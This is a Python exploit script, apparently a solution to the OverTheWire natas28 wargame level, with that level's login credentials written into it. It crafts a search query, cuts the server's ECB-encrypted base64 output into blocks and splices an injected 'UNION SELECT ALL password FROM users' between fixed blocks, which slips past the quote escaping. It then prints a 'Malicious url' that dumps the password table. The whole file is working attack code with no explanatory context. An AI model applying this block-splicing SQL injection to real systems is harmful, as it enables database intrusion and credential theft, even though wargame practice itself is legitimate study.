import requests
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
from urllib.parse import quote
from base64 import b64decode, b64encode

BLOCK_SIZE = 22 #block size with no base64  decoding

DUMMY_BLOCK="ItlMM3qTizkRB5P2zYxJsb"
HEADER_BLOCK="G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
BAD_BLOCK="ItlMM3qTizkRB5P2zYxJsb"
TRAILER_BLOCK="c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

auth = HTTPBasicAuth('natas28', 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas28.natas.labs.overthewire.org/index.php"
MaliciousBlock = "AAAAAAAAA' " #do not change it


Query ="UNION SELECT ALL password FROM users; --"

payload = {"query":MaliciousBlock+Query +" "}

#first 2 blocks are always the same, 3rd block escapes / character, next will have malicious query last 2 blocks are always the same
response = requests.post(url=url, auth=auth, headers=headers, data=payload, verify=False)
#get url data and split it
urldata = response.url.partition("?")[2]
data = dict(s.split("=") for s in urldata.split("&"))

for k,v in data.items():
    data[k] = unquote(v)

query_split = [data["query"][i:i+BLOCK_SIZE] for i in range (0,len(data["query"]),BLOCK_SIZE)]
SQLInjection = data["query"][len(HEADER_BLOCK) + len(BAD_BLOCK):]
#decoding base64 and encoding base64 improves link quality, sometimes this link will not work
MaliciousQuery = quote(b64encode(b64decode(HEADER_BLOCK + DUMMY_BLOCK + SQLInjection + TRAILER_BLOCK))) #url encoded malicious query
Url = "http://natas28.natas.labs.overthewire.org/search.php/?query="+MaliciousQuery
print("Malicious url: ",Url)